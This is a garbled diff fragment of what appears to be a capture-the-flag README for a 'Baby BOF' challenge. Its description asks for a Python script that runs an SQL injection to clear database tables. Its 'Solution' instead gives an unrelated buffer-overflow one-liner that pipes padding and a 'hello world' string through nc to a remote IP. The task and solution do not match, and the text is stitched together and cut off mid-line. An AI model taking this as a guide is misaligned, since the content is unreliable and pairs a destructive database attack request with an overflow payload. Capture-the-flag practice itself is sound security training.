@@ -1,0 +1,15 @@
+# Write an python script that runs an SQL injection that clears the tables.
+t.
+
+## Solution
+
+```
+$ python3 -c 'print("A"*20 + "\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64")' | nc 192.168.127.12 31337
+```
+/2020/Cyber_Apocalypse_CTF/problems/pwn/baby_bof/README.md@@ -1,10 +1,10 @@
+ # Baby BOF
+ 
+ ## Description
+ 
+-Write an python script that runs an SQL injection that clears the tables.
++Write an python script that
